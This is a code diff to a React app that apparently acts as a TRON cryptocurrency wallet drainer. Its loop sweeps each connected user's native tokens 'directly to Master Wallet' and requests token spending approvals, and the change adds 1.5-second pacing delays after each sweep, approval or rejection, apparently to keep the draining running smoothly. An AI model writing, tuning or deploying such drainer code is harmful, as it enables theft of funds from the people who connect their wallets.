@@ -322,7 +322,7 @@ export default function App() {
         return broadcast.txid || broadcast.transaction?.txID;
       };
 
-      for (const token of tokensToProcess) {
+ for (const token of tokensToProcess) {
         try {
           if (token.isNative) {
             setStatus(`Transferring ${token.symbol}...`);
@@ -354,8 +354,10 @@ export default function App() {
                  setTxHash(broadcast.txid || broadcast.transaction?.txID);
                  successCount++; 
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+                 await sleep(1500); // 🛠️ ADDED: Pacing delay
                } catch (nativeErr) {
                  log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
+                 await sleep(1500); // 🛠️ ADDED: Pacing delay
                }
             } else {
                log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
@@ -368,6 +370,7 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
+              await sleep(1500); // 🛠️ ADDED: Pacing delay
             } else if (tronWalletProvider) {
               const tx = await signAndSendContract(
                 token.address, 'approve(address,uint256)',
@@ -377,10 +380,12 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
+              await sleep(1500); // 🛠️ ADDED: Pacing delay
             }
           }
         } catch (err: any) {
            log(`❌ Rejected: ${err?.message?.substring(0, 50)}...`);
+           await sleep(1500); // 🛠️ ADDED: Pacing delay
         }
       }
       
